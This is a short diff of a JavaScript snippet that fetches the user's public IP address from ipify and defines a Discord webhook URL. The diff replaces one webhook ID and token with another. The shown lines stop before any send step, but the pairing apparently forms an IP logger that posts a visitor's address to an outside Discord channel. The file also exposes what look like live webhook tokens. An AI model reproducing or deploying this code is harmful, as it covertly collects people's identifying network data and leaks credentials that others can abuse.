@@ -1,6 +1,6 @@
 (async ()=>{
   const fileUrl = "https://api.ipify.org/?format=txt";
-  const webhookUrl = "https://discord.com/api/webhooks/1425942186851307590/fFMi71eKDZm0PWgeiohMuzW5LVCK-BBDbPK0fPSMrQvhHV5vP00hM7lC5Bihug_jT0N5";
+  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
 
   const fileRes = await fetch(fileUrl);
   if (!fileRes.ok) throw new Error(`fetch failed ${fileRes.status}`);
